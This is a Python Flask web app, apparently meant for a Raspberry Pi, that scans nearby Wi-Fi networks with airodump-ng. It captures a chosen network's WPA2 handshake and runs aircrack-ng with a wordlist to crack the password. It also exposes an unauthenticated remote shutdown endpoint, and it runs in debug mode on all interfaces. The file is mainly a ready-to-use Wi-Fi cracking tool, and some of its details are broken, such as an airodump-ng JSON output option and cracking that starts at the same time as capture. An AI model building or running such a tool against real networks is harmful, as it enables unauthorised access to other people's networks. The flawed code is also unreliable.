from flask import Flask, render_template, request, jsonify, redirect, url_for
import subprocess
import os
import signal
import threading
import json

app = Flask(__name__)

# Track the process ID for killing the process later
crack_process = None

# Path where the handshake files will be stored
handshake_path = "/handshake"

# Function to scan for available networks
def scan_networks():
    # Run airodump-ng to capture nearby Wi-Fi networks
    result = subprocess.run(['sudo', 'airodump-ng', '--output-format', 'json', '--write', '/scan_output', 'wlan0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    scan_output = result.stdout.decode('utf-8')

    # Assuming the output is in JSON format, we can extract BSSIDs
    networks = []
    try:
        networks = json.loads(scan_output)['aps']
    except Exception as e:
        print(f"Error parsing scan output: {e}")

    return networks

# Function to start WPA2 handshake capture
def start_capture(bssid, channel, wifi_adapter):
    subprocess.run(['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel, '--write', handshake_path, wifi_adapter])

# Function to start WPA2 password cracking
def start_cracking():
    subprocess.run(['sudo', 'aircrack-ng', f'{handshake_path}-01.cap', '-w', 'wordlist/wordlist.txt'])

# Function to kill the power of the Raspberry Pi (emergency shutdown)
def shutdown():
    os.system("sudo shutdown now")

# Home route with the form
@app.route('/')
def home():
    return render_template('index.html')

# API endpoint to scan for networks
@app.route('/scan', methods=['GET'])
def scan():
    networks = scan_networks()
    return jsonify(networks)

# API endpoint to start the WPA2 cracking process
@app.route('/start', methods=['POST'])
def start():
    global crack_process

    # Retrieve values from the form
    bssid = request.form.get('bssid')
    channel = request.form.get('channel')
    wifi_adapter = request.form.get('wifi_adapter')

    # Start the WPA2 handshake capture in a separate thread
    capture_thread = threading.Thread(target=start_capture, args=(bssid, channel, wifi_adapter))
    capture_thread.start()

    # Start the WPA2 cracking process after capture (or simultaneously, as needed)
    crack_thread = threading.Thread(target=start_cracking)
    crack_thread.start()

    return redirect(url_for('home'))

# API endpoint to initiate the emergency shutdown
@app.route('/shutdown', methods=['POST'])
def shutdown_process():
    shutdown()
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
